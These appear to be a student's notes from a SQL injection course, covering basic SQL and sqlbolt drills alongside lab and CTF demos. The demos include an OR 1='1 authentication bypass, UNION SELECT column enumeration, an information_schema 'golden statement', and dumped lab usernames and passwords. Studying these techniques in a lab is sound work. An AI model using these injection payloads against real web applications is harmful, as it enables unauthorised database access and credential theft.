### http://10.50.29.140
# SQL Commands
* Select <-- extracts data from database
* Union <--  used to combine the reuslt of 2 or more statements
* Show Tables <--
* Show Columns <--
* Where <--
* Like <--
* Use
* Update
* Delete
* Insert into
* Create Database
* Alter Database
* Create Table
* Alter Table
* Drop Table
* Create Index
* Drop Index
### We are only extracting information in this module, so the only important onces that we will use are Union and Select
### At the end o every sql command you have to put a ";"
### 3 Default databases are information_schema, mysql, and performance_schema
## SQL Demo
```
mysql

show databases;

show tables from session; # Shows tables inside of session database

show colums from session.tires; # Shows all the colums that are in the tires table inside of the session database

select name,tireid,size,cost, from session.tires; # This shows the data inside of session.tires

show columns from session.car;

select carid,name,cost,size from session.tires union select carid,color,cost from session.car; # selects multiple things and joins them in the output
```
# Injecting
* SELECT id FROM users WHERE name=‘[tom' OR 1='1’ AND pass=‘tom' OR 1='1’]
  - You are forcing a boolean that will result in true into the user and password variable
### SQL Injecting Demo / authentication bypass
```
' OR 1='1
# Once we got in, we opened the developer console (inspect) and found a username variable
# Make sure to click the radio button to see information in RAW format
# We then copied that variable added a "?" to the url because we are passing information and pasted the variable
# After doing this we were shown usernames and passwords in that variable
```
### Demo POST (text box)
1. Identify vulnerable field
2. Identify number of columns
3. Craft the golden statement
4. Craft the query
5. Craft Queries
```
# step 1Identify vulnerable field
Audi' OR 1='1

# step 2 Identify Columns
Audi' UNION SELECT 1,2,3,4,5 #     5 columns 

# step 3 Create Golden Statement
Audi ' UNION SELECT table_schema,2,table_name,column_name,5 FROM information_schema.columns #    because we want 3 columns we need 2 and 5 as placeholders
[Audi ' UNION SELECT <column>,<column>,<column> FROM database.table #

# step 4/5 Craft Query
Audi ' UNION SELECT studentID,2,username,passwd,5 FROM session.userinfo #
Audi ' UNION SELECT id,2,name,pass,5 FROM session.user #
Audi ' UNION SELECT username,2,passwd,jump,5 FROM session.userinfo #
Audi ' UNION SELECT tireid,2,size,cost,5 FROM session.Tires #
Audi ' UNION SELECT carid,name,color,cost,5 FROM sessin.car #         wont shoow column 2 due to it being hidden
```
## use placeholders when there are more columns than values youre looking for 
### DEMO GET (search bar) USE MORE
```
http://10.50.29.140/uniondemo.php?Selection=1&Submit=Submit      replace submit=submit
# In the search bar replace & with:
OR 1=1

# Identify vulnerable field (selection 2)
?Selection=3 UNION SELECT 1,2,3

# Identify number of columns (3, displayed in 1,3,2 order)
?Selection=3 UNION SELECT 1,2,3

# Golden Statement order displayed in 1,3,2
?Selection=3 UNION SELECT table_schema,column_name,table_name FROM information_schema.columns

?Selection=3 UNION SELECT id,pass,name FROM session.user

' union select @@version #- this gets the version of the database (put as a value like color or size n the left side of statement 

# Anbotate databases, tables, and columns
Database: session

session
Tables: Tires,car,session_log,user,userinfo

Columns
(Tires): tireid, name, size, cost
(car): carid, name, type, cost, color, year
etc....
```
`delete from comments where ID = 57; 57`


## theyre case sensitive
## SSgt dow demos 
SHOW DATABSES ; 
use information schema ;
  show columns ; 
  show columns from columns ; 
  select table_name,column_name from information_schema.columns ;
 ## select table_schema,table_name,column_name from information_schema.columns ;

show tables from session ;

show columns from session.tires ;

select tireid,name,size from session.tires ;

show columns from session.car

select tireid,name,size from session.tires UNION SELECT name,type,cost from session.car ;

select tireid,name,size,4 from session.tires UNION SELECT name,type,cost,color from session.car ; color needs the 4 there to be added as 4 is the placeholder for it and pay attention to the number of columns 


## union select rquires 2 columns thats where placeholders come in 




## show columns from <database>.<table> ; syntax for small queries

=, !=, < <=, >, >=	Standard numerical operators	col_name != 4
BETWEEN … AND …	Number is within range of two values (inclusive)	col_name BETWEEN 1.5 AND 10.5
NOT BETWEEN … AND …	Number is not within range of two values (inclusive)	col_name NOT BETWEEN 1 AND 10
IN (…)	Number exists in a list	col_name IN (2, 4, 6)
NOT IN (…)	Number does not exist in a list	col_name NOT IN (1, 3, 5)


## sqlbolt.com activity
SELECT Director FROM Movies; gets directrs from movies
SELECT Title FROM Movies;
SELECT Title,Director FROM Movies;
SELECT Title,Year FROM Movies; 
SELECT * FROM Movies; gets all columns from mthe movies table 
SELECT <column> FROM <table>

SELECT id, title FROM movies    finds the movie with the id of 6
WHERE id = 6;

SELECT Year, title FROM movies       finds the movies released between 2000 and 2010
WHERE Year >= 2000 AND Year <=2010;

SELECT Year, title FROM movies                   finds movies not between 2000 and 2010
WHERE Year NOT BETWEEN 2000 AND 2010 ;

SELECT Title, Year FROM movies             Find the first 5 Pixar movies and their release year 
 WHERE Year BETWEEN 1995 AND 2003;

SELECT Title FROM movies            finds all toy story movies
WHERE Title LIKE "Toy Story%";

SELECT * FROM movies                finds all movies by john lassester
WHERE Director = "John Lasseter";
  ## LIKE "%word%" is used t find a string in a word 
SELECT * FROM movies              finds all WALL-E movies
WHERE Title LIKE "WALL%";



## CTFs
#1 ' UNION SELECT table_schema,table_name FROM information_schema.columns #
column_name
#2 
' UNION SELECT table_schema,table_name FROM information_schema.columns #
sqlinjection	categories
sqlinjection	members
sqlinjection	orderlines
sqlinjection	orders
sqlinjection	payments
sqlinjection	permissions
sqlinjection	products
sqlinjection	share4


#3
http://127.0.0.1:11751/cases/productsCategory.php?category=1%20union%20select%20permission,username,password%20FROM%20sqlinjection.members
after category 1 do union select permission,username,password FROM sqlinjection.members you need 3 fields because it uses 3 fields 

Boss	BRJHlIX600KYqu6JHCpa	1.00
Maverick	turn&burn	3.00
phreak	pwd	4.00
Susan	flowers99	3.00
TW	imAPlaya	2.00
1-2-3-4	sayULuvM3	2.00
rich_kid	1M$	2.00
p0pStar	thrilla	2.00
Joe	vato

#4

#5 
' union select @@version #

#6
switch sqlinjection to payments table 

## golden statement
  ' UNION SELECT table_schema,table_name,column_name FROM information_schema.columns #
      >use placeholders when we n eed more columns like numbers, also this is a baseline and will help set up and carry the rest of the injections 
